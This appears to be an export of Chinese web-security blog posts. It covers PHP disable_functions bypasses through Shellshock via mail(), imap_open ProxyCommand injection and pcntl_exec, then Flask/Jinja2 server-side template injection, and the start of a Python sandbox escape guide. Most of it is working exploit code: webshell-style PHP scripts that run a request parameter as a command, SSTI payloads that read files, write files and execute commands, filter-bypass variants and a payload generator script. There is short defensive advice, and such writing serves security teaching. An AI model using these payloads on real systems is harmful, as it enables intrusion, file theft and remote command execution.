sender address when using sendmail with the -f sendmail option. The user that the webserver runs as should be added as a trusted user to the sendmail configuration to prevent a ‘X-Warning’ header from being added to the message when the envelope sender (-f) is set using this method. For sendmail users, this file is /etc/mail/trusted-users. 简单地说，就是这个参数可以通过添加附加的命令作为发送邮件时候的配置，比如使用-f参数可以设置邮件发件人等，官方文档在范例Example #3也有所演示，具体可以参考官方文档：http://php.net/manual/zh/function.mail.php。 为什么关注最后第五个参数呢？ 我们看到在PHP mail()函数的源代码mail.c中，有如下代码片段，其中mial()函数的第五个参数即为extra_cmd： 12345if (extra_cmd != NULL) &#123; spprintf(&amp;sendmail_cmd, 0,\"%s %s\", sendmail_path, extra_cmd);&#125; else &#123; sendmail_cmd = sendmail_path;&#125; 当extra_cmd（用户传入的一些额外参数）存在的时候，调用spprintf()将sendmail_path和extra_cmd组合成真正执行的命令行sendmail_cmd。 然后将sendmail_cmd丢给popen()执行： 123456789#ifdef PHP_WIN32 sendmail = popen_ex(sendmail_cmd,\"wb\", NULL, NULL TSRMLS_CC);#else /* Since popen() doesn't indicate if theinternal fork() doesn't work *(e.g. the shell can't be executed) we explicitly set it to 0 to be *sure we don't catch any older errno value. */ errno = 0; sendmail = popen(sendmail_cmd,\"w\");#endif 如果系统默认sh是bash，popen()会派生bash进程，而我们刚才提到的CVE-2014-6271漏洞，直接就导致我们可以利用mail()函数执行任意命令，绕过disable_functions的限制。 同样，我们搜索一下php的源码，可以发现，明里调用popen派生进程的php函数还有imap_mail，如果你仅仅通过禁用mail函数来规避这个安全问题，那么imap_mail是可以做替代的。当然，php里还可能有其他地方有调用popen或其他能够派生bash子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。也就是说，单单禁用mail()函数进行黑名单的防御，是很容易被Bypass的。 BypassExp如下： 123456789101112131415161718192021222324252627&lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271 function shellshock($cmd) &#123; // Execute a command via CVE-2014-6271 @mail.c:283 $tmp = tempnam(\".\",\"data\"); putenv(\"PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1\"); // In Safe Mode, the user may only alter environment variableswhose names // begin with the prefixes supplied by this directive. // By default, users will only be able to set environment variablesthat // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, // PHP will let the user modify ANY environment variable! mail(\"a@127.0.0.1\",\"\",\"\",\"\",\"-bv\"); // -bv so we don't actuallysend any mail $output = @file_get_contents($tmp); @unlink($tmp); if($output != \"\") return $output; else return \"No output, or not vuln.\"; &#125; echo shellshock($_REQUEST[\"cmd\"]); ?&gt; 在我本地的Metasploitable2虚拟机测试，其存在Bash破壳漏洞，直接Bypass getshell： 防御方法修补Bash破壳漏洞。 0x07 利用imap_open()绕过环境配置安装PHP的imap扩展：apt-get install php-imap；在php.ini中开启imap.enable_insecure_rsh选项为On；重启服务。 成功配置好环境后，在phpinfo中会看到如下信息： 基本原理 PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit Framework的一部分。 imap_open()imap_open()函数定义如下： 1resource imap_open ( string $mailbox , string $username , string $password [, int $options = 0 [, int $n_retries = 0 [, array $params = NULL ]]] ) mailbox参数的值由服务器名和服务器上的mailbox文件路径所组成，INBOX代表的是当前用户的个人邮箱。比如，我们可以通过如下方式来设置mailbox参数： 1$mbox = imap_open (\"&#123;localhost:993/PROTOCOL/FLAG&#125;INBOX\", \"user_id\", \"password\"); 在括号内的字符串中，我们可以看到服务器名称（或者IP地址）、端口号以及协议名称。用户可以在协议名后设置标志（第3个参数）。 在PHP官方文档中，关于imap_open参数的设置有如下一段警告内容： 根据警告信息，除非我们禁用了enable_insecure_rsh选项，否则不要将用户数据直接传输到mailbox参数中。 为什么官方文档会有这个警告信息呢？ 简单地说，就是imap_open()函数会调用到rsh的程序，而该程序中会调用execve系统调用来实现rsh的调用，其中的邮件地址参数是由imap_open()函数的mailbox参数传入，同时，由于rsh命令是ssh命令的符号链接，所以当我们利用ssh的-oProxyCommand参数来构造恶意mailbox参数时就能执行恶意命令。 具体分析过程请参考《如何在PHP安装中绕过disable_functions》。 -oProxyCommand参数ProxyCommand指定用于连接服务器的命令。 当我们执行以下这条命令时，可以发现即便我们没有建立与localhost的SSH连接，也会创建mi1k7ea文件： 1234root@sq:/var/www/html# ssh -oProxyCommand=\"touch mi1k7ea\" localhostssh_exchange_identification: Connection closed by remote hostroot@sq:/var/www/html# ls | grep mi1k7eami1k7ea 至此，就知道了可以通过-oProxyCommand参数来执行系统命令。 但是我们不能直接将上述命令直接转移到PHP脚本来代替imap_open服务器地址，因为在解析时它会将空格解释为分隔符和斜杠作为标志。但是我们可以使用\\$IFS这个shell变量来替换空格符号或使用\\t替换。还可以在bash中使用Ctrl + V热键和Tab键插入标签。要想绕过斜杠，可以使用base64编码和相关命令对其进行解码。 Bypassexp如下，先判断是否存在imap_open()函数，然后构造exp执行通过外部GET输入的命令然后保存结果到本地文件中，最后输出结果文件内容，注意sleep(5)是为了等imap_open()函数执行完、因为该函数执行时需要DNS轮询会存在延时： 1234567891011&lt;?phperror_reporting(0);if (!function_exists('imap_open')) &#123; die(\"no imap_open function!\");&#125;$server = \"x -oProxyCommand=echo\\t\" . base64_encode($_GET['cmd'] . \"&gt;/tmp/cmd_result\") . \"|base64\\t-d|sh&#125;\";//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . \"&gt;/tmp/cmd_result\") . '|base64$IFS$()-d|sh&#125;';imap_open('&#123;' . $server . ':143/imap&#125;INBOX', '', ''); // or var_dump(\"\\n\\nError: \".imap_last_error());sleep(5);echo file_get_contents(\"/tmp/cmd_result\");?&gt; 当然，替换空格符的\\t也可以换成$IFS$()来Bypass掉。 此时环境中disable_functions配置如下： 访问，能够成功Bypass： 防御方法 设置imap.enable_insecure_rsh选项为Off； 可以的话禁用imap_open()函数； 0x08 利用pcntl插件绕过前提条件前提是PHP安装并启用了pcntl插件。 基本原理原理比较简单，就是利用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令，从而Bypass黑名单。 Bypass这里直接贴exp： 12345#exec.php&lt;?php pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/b4dboy.sh&quot;));?&gt;#/tmp/b4dboy.sh#!/bin/bashls -l / 防御方法disable_functions的黑名单中添加pcntl相关函数实现禁用。 参考无需 sendmail：巧用 LD_PRELOAD 突破 disable_functions PHP Webshell下命令执行限制及绕过disable_function方法总结 PHP Execute Command Bypass Disable_functions PHP中通过bypass disable functions执行系统命令的几种方式 如何在PHP安装中绕过disable_functions","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"浅析Python Flask SSTI","date":"2019-06-02T03:18:04.000Z","path":"2019/06/02/浅析Python-Flask-SSTI/","text":"0x01 SSTISSTI(Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的。 通常在CTF中多是以Python的Flask框架结合Jinja2的形式出现。 0x02 背景知识FlaskFlask是一个使用Python编写的轻量级Web应用框架。其 WSGI 工具箱采用Werkzeug，模板引擎则使用Jinja2。 Jinja2Jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。 在Jinja2中，存在三种语句： 123控制结构 &#123;% %&#125;变量取值 &#123;&#123; &#125;&#125;注释 &#123;# #&#125; Jinja2模板中使用上述第二种的语法表示一个变量，它是一种特殊的占位符。当利用Jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，Jinja2支持Python中所有的Python数据类型比如列表、字段、对象等。被两个括号包裹的内容会输出其表达式的值。 Jinja2中的过滤器可以理解为是Jinja2里面的内置函数和字符串处理函数。 模板渲染函数render_template()使用render_template()方法可以渲染模板，你只要提供模板名称和需要作为参数传递给模板的变量就行了。 渲染过程如下，render_template()函数的第一个参数为渲染的目标html页面、第二个参数为需要加载到页面指定标签位置的内容，来自网上摘的一个图： 其实render_template()的功能是先引入home.html，同时根据后面传入的参数，对html进行修改渲染。 注意：当在HTML模板中在标签内传入的内容是通过如而非%s这种传参形式时，HTML自动转义默认开启。因此，如果 name 包含 HTML ，那么会被自动转义。 这里我们搭个简单的Demo瞧瞧： 1234567891011121314151617from flask import Flaskfrom flask import request, render_template_string, render_templateapp = Flask(__name__)@app.route('/login')def hello_ssti(): person = &#123; 'name': 'hello', 'secret': 'This_is_my_secret' &#125; if request.args.get('name'): person['name'] = request.args.get('name') return render_template(\"index.html\", person=person)if __name__ == \"__main__\": app.run(debug=True) 然后在当前目录新建templates目录，在其中新建index.html： 1&lt;h2&gt;Hello &#123;&#123; person.name &#125;&#125;!&lt;/h2&gt; 开启Flask服务，访问输入参数name，在页面会直接显示出来： 当尝试进行XSS时，会自动被HTML编码过滤： render_template_string()这个函数作用和前面的类似，顾名思义，区别在于只是第一个参数并非是文件名而是字符串。也就是说，我们不需要再在templates目录中新建HTML文件了，而是可以直接将HTML代码写到一个字符串中，然后使用该函数渲染该字符串中的HTML代码到页面即可。 基于前面修改的Demo如下： 123456789101112131415161718from flask import Flaskfrom flask import request, render_template_string, render_templateapp = Flask(__name__)@app.route('/login')def hello_ssti(): person = &#123; 'name': 'hello', 'secret': 'This_is_my_secret' &#125; if request.args.get('name'): person['name'] = request.args.get('name') template = '&lt;h2&gt;Hello &#123;&#123; person.name &#125;&#125;!&lt;/h2&gt;' return render_template_string(template, person=person)if __name__ == \"__main__\": app.run(debug=True) 访问的结果和前面的一样，而且也是自动进行了HTML实体编码。 0x03 漏洞点前面简单说了下两个模板渲染函数的原理，那么漏洞点在哪里呢？ 由前面知道，要想实现模板注入，首先必须得注入模板执行语句，如： 12控制结构 &#123;% %&#125;变量取值 &#123;&#123; &#125;&#125; 但是在前面两个函数的Demo中，html内容中是以这种变量取值语句的形式来处理传入的参数的，此时person.name的值无论是什么内容，都会被当作是字符串来进行处理而非模板语句来执行，比如即使传入的是config来构成，但其也只会把参数值当作是字符串而非模板语句： 既然这样，要想整个参数输入的内容被当成是模板语句来执行，就只能是通过%s这种传参形式来实现了，修改的Demo如下： 12345678910111213141516171819from flask import Flaskfrom flask import request, render_template_string, render_templateapp = Flask(__name__)@app.route('/login')def hello_ssti(): person = &#123; 'name': 'hello', 'secret': 'This_is_my_secret' &#125; if request.args.get('name'): person['name'] = request.args.get('name') # changed template = '&lt;h2&gt;Hello %s!&lt;/h2&gt;' % person['name'] return render_template_string(template, person=person)if __name__ == \"__main__\": app.run(debug=True) 此时将换成了%s，通过传入字符串的方式传入内容，当传入恶意构造的模板语句时就会造成SSTI。 验证漏洞，传入模板变量语句3，注意加号要URL编码，当看到返回3时证明语句成功注入执行了： 这里就能得出结论了： SSTI漏洞点为在render_template_string()函数中，作为模板的字符串参数中的传入参数是通过%s的形式获取而非变量取值语句的形式获取，从而导致攻击者通过构造恶意的模板语句来注入到模板中、模板解析执行了模板语句从而实现SSTI攻击； SSTI漏洞风险只出现在render_template_string()函数，而render_template()函数并不存在SSTI风险，因为render_template()函数中是传入到一个模板HTML文件中，而该html文件这种的变量取值语句实现不了修改成%s这种形式的； 0x04 漏洞利用这里Demo就拿上一小节的就好。 XSS传入什么返回什么，第一时间想到的就是XSS。之前的变量取值语句传入时是会进行自动HTML编码的，但%s传入的参数是不会自动进行HTML编码的，因为Flask并没有将整个内容视为字符串。 敏感信息泄露访问对应的全局变量即可直接泄露出配置文件的内容。 比如config变量： 还有Demo中secret变量： 某些情况下，当获取secret_key后，即可对session进行重新签名，完成session的伪造。 注意：Flask的session是保存在客户端，称为客户端session，会进行编码和校验。 整合一下可利用的PoC技巧： 12345?name=&#123;&#123;config&#125;&#125;?name=&#123;&#123;person.secret&#125;&#125;?name=&#123;&#123;self.__dict__&#125;&#125;?name=&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config&#125;&#125;?name=&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config&#125;&#125; 读写文件这里需要用到Python沙箱逃逸的元素链，这里直接给出payload，具体构造过程可参考《Python沙箱逃逸小结》。 读文件 这里只给个演示的poc，其他绕过类的poc参考《Python沙箱逃逸小结》构造即可： 1234567# Python2?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;E:/passwd&apos;).read()&#125;&#125;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;).read()&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;E:/passwd&apos;).read()# Python3中无file，只能用open&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;E:/passwd&apos;).read() 写文件 这里只给个演示的poc，其他绕过类的poc参考《Python沙箱逃逸小结》构造即可： 1234567# Python2?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;E:/m7.txt&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;)&#125;&#125;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;)&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;)# Python3中无file，只能用open&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;) 命令执行命令执行才是SSTI的重点，主要分为两种形式。 利用from_pyfile加载对象到Flask配置环境这种利用方式算是一种简单的漏洞组合拳。 先利用文件写入漏洞写一个Python文件： 1?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;E:/m7.py&apos;,&apos;w&apos;).write(&apos;from subprocess import check_output\\nRUNCMD=check_output\\n&apos;)&#125;&#125; 然后使用config.from_pyfile将该Python文件加载到config变量中： 1?name=&#123;&#123;config.from_pyfile(&apos;E:/m7.py&apos;)&#125;&#125; 访问全局变量config查看是否加载成功： 加载成功后，就可以通过以下形式执行任意命令了： 1?name=&#123;&#123;config[&apos;RUNCMD&apos;](&apos;whoami&apos;)&#125;&#125; 可知，这种利用方式是直接有回显的。 利用元素链中可利用的命令执行函数元素链的payload就很多，具体看《Python沙箱逃逸小结》来进行各种payload的构造就好，这里只给出几个简单的示例： os.system()的利用是无回显的： 1?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;calc&apos;)&#125;&#125; 要想有回显，可利用如下几个： 123456789# os.popen(cmd).read()?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].popen(&apos;whoami&apos;).read()&#125;&#125;# platform.popen(cmd).read()?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;platform&apos;).popen(&apos;whoami&apos;).read()&#125;&#125;# sys.modules间接调用前面两个模块?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;sys&apos;).modules[&apos;os&apos;].popen(&apos;whoami&apos;).read()&#125;&#125;?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;sys&apos;).modules[&apos;platform&apos;].popen(&apos;whoami&apos;).read()&#125;&#125; 更多的变形技巧参考《Python沙箱逃逸小结》。 控制结构 当然，前面的利用都是基于Jinja2的变量取值语句，除此之外我们也可以利用控制结构来实现利用： 12345# 命令执行?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;whoami&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;# 文件操作?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;E:/passwd&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 针对Python3有个脚本会自动帮我们生成需要的控制结构形式的payload： 123456789101112131415161718# coding=utf-8# python 3.5from flask import Flaskfrom jinja2 import Template# Some of special namessearchList = ['__init__', \"__new__\", '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', \"__instancecheck__\", '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__']neededFunction = ['eval', 'open', 'exec']pay = int(input(\"Payload?[1|0]\"))for index, i in enumerate(&#123;&#125;.__class__.__base__.__subclasses__()): for attr in searchList: if hasattr(i, attr): if eval('str(i.'+attr+')[1:9]') == 'function': for goal in neededFunction: if (eval('\"'+goal+'\" in i.'+attr+'.__globals__[\"__builtins__\"].keys()')): if pay != 1: print(i.__name__,\":\", attr, goal) else: print(\"&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='\" + i.__name__ + \"' %&#125;&#123;&#123; c.\" + attr + \".__globals__['__builtins__'].\" + goal + \"(\\\"[evil]\\\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\") 本地Python2运行结果： 12345Payload?[1|0]1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='Decimal' %&#125;&#123;&#123; c.__new__.__globals__['__builtins__'].eval(\"[evil]\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='Decimal' %&#125;&#123;&#123; c.__new__.__globals__['__builtins__'].open(\"[evil]\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='Template' %&#125;&#123;&#123; c.__new__.__globals__['__builtins__'].eval(\"[evil]\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='Template' %&#125;&#123;&#123; c.__new__.__globals__['__builtins__'].open(\"[evil]\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 测试一下也是OK的： 1?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Decimal&apos; %&#125;&#123;&#123; c.__new__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;whoami&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 具体在Python3的表现可自行测试。 0x05 结合Flask和Jinja2特性的沙箱逃逸技巧这里只补充《Python沙箱逃逸小结》中没提到的关于Flask和Jinja2结合的一些沙箱逃逸技巧。 无法直接获取全局变量config通过current_app的payload来替换config获取配置信息： 123?name=&#123;&#123;config&#125;&#125;?name=&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config&#125;&#125;?name=&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config&#125;&#125; 过滤引号request.args是Flask中的一个属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来，进而绕过了引号的过滤： 1?name=&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=e:/passwd 过滤双下划线同样是利用Flask的request.args属性来绕过： 1?name=&#123;&#123;&apos;&apos;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&apos;E:/passwd&apos;).read()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 当然，也可以将其中的request.args改为request.values，利用post的方式进行传参： 1234POST /login?name=&#123;&#123;&apos;&apos;[request.values.class][request.values.mro][2][request.values.subclasses]()[40](&apos;E:/passwd&apos;).read()&#125;&#125; HTTP/1.1...class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 0x06 检测与防御检测方法 在Flask工程中全局搜索是否有使用render_template_string()函数，若存在则进一步判断该函数的第一个参数的值获取需要渲染的内容的输入形式，若为变量取值语句的形式则不存在SSTI漏洞，若为%s传入需渲染的内容的形式则存在SSTI漏洞。 防御方法 尽量使用render_template()函数而非render_template_string()函数； 使用render_template_string()函数时，传入需渲染的内容参数时必须采用变量取值语句的形式，禁止使用%s的传参形式进行传参； 0x07 参考浅析SSTI(python沙盒绕过) python-flask-ssti(模版注入漏洞) python 沙箱逃逸","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Python","slug":"Python","permalink":"https://www.mi1k7ea.com/tags/Python/"},{"name":"SSTI","slug":"SSTI","permalink":"https://www.mi1k7ea.com/tags/SSTI/"}]},{"title":"Python沙箱逃逸小结","date":"2019-05-31T13:39:37.000Z","path":"2019/05/31/Python沙箱逃逸小结/","text":"所谓的Python沙盒，即以一定的方法模拟Python终端，实现用户对Python的使用。而Python沙箱逃逸，就是攻击者通过某种绕过的方式，从模拟的沙箱环境中逃逸出来，从而实现执行系统命令等攻击操作。 0x01 背景知识dir()函数dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法__dir__()，该方法将被调用。如果参数不包含__dir__()，该方法将最大限度地收集参数信息。 1234&gt;&gt;&gt;dir() # 获得当前模块的属性列表['__builtins__', '__doc__', '__name__', '__package__', 'arr', 'myslice']&gt;&gt;&gt; dir([ ]) # 查看列表的方法['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort'] __builtins____builtins__即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于__builtins__却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。 可以通过dir()函数来查看该模块内包含的函数，同时也可以通过dict属性调用这些函数。 12345678# 下面代码可列出所有的内联函数&gt;&gt;&gt; dir(__builtins__)['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']&gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('ls')# Python3有一个builtins模块，可以导入builtins模块后通过dir函数查看所有的内联函数import builtinsdir(builtins) __import____import__接收字符串作为参数，导入该字符串名称的模块。 如import sys相当于__import__(‘sys’)，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤，如：__import__(‘o’+’s’).system(‘ca’+’lc’)。 __bases__列出基类： 1''.__class__.__bases__ __mro____mro__用于展示类的继承关系，类似于bases： 1''.__class__.__mro__ __globals____globals__是一个特殊属性，能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules。 object类python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过__mro__和__bases__两种方式来创建object的方法如下： 1234567891011''.__class__.__mro__[2][].__class__.__mro__[1]&#123;&#125;.__class__.__mro__[1]().__class__.__mro__[1][].__class__.__mro__[-1]&#123;&#125;.__class__.__mro__[-1]().__class__.__mro__[-1]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用 导入模块常规的3种导入方式： 123import xxxfrom xxx import *__import__('xxx') 除此之外，也可以通过路径引入模块，如在Linux系统中Python的os模块的路径一般都是在 /usr/lib/python2.7/os.py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数： 1234&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules['os']='/usr/lib/python2.7/os.py'&gt;&gt;&gt; import os&gt;&gt;&gt; import导入机制：当 import 一个模块时首先会在 sys.modules 这个字典中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用 import 的模块的 Local 命名空间中。如果没有加载则从 sys.path 目录中按照模块名称查找模块文件，模块可以是 py、pyc、pyd，找到后将模块载入内存，并加到 sys.modules 中，并将名称导入到当前的 Local 命名空间。 通过 from a import b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。通过 import a as b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。对于嵌套导入的，比如 a.py 中存在一个 import b，那么 import a 时，a 和 b 模块都会被添加到 sys.modules 字典中，a 会被导入到当前的 Local 命名空间中，虽然模块 b 已经加载到内存了，如果访问还要再明确的在本模块中 import b。 导入模块时会执行该模块。 所以说如果某一个模块导入了os模块，我们就可以利用该模块的 dict 进而使用os模块，如下： 1234import linecachelinecache.__dict__['os'].system('ls')# 等价于linecache.os.system('ls') 0x02 可利用的模块和方法在 Python 的内建函数中，有一些函数可以帮助我们实现命令执行或文件操作的利用。 命令执行类os模块12345import os# 执行shell命令不会返回shell的输出os.system('whoami')# 会产生返回值，可通过read()的方式读取返回值os.popen(\"whoami\").read() commands模块commands模块会返回命令的输出和执行的状态位，仅限Linux环境 1234import commandscommands.getstatusoutput(\"ls\")commands.getoutput(\"ls\")commands.getstatus(\"ls\") subprocess模块123import subprocesssubprocess.call(command, shell=True)subprocess.Popen(command, shell=True) pty模块仅限Linux环境 12import ptypty.spawn(\"ls\") timeit模块12import timeittimeit.timeit(\"__import__('os').system('dir')\",number=1) platform模块12import platformprint platform.popen('dir').read() __import__()函数这个函数只是通过引入其他命令执行库实现命令执行： 1__import__(\"os\").system(\"ls\") importlib模块和上面同理： 1234import importlibimportlib.import_module('os').system('ls')# Python3可以，Python2没有该函数importlib.__import__('os').system('ls') exec()/eval()/execfile()/compile()函数这几个函数都能执行参数的Python代码。 注意：execfile()只存在于Python2，Python3没有该函数。 12345678910exec(\"__import__('os').system('calc')\")eval('__import__(\"os\").system(\"calc\")')execfile('exp.py')# 